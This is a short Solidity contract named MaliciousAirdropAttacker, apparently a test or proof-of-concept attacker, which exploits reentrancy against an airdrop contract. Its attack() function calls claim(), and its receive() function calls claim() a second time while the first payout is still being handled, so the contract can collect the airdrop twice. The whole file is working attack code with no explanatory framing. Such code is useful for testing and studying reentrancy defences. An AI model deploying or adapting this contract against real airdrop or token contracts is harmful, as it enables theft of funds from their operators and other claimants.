// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IAirdrop {
    function claim() external;
}

contract MaliciousAirdropAttacker {
    IAirdrop public airdrop;
    bool public attacking;

    constructor(address _airdrop) {
        airdrop = IAirdrop(_airdrop);
    }

    function attack() external {
        attacking = true;
        airdrop.claim();
    }

    receive() external payable {
        if (attacking) {
            attacking = false;
            airdrop.claim();
        }
    }

    // Ensure the contract can receive funds
    fallback() external payable {}
}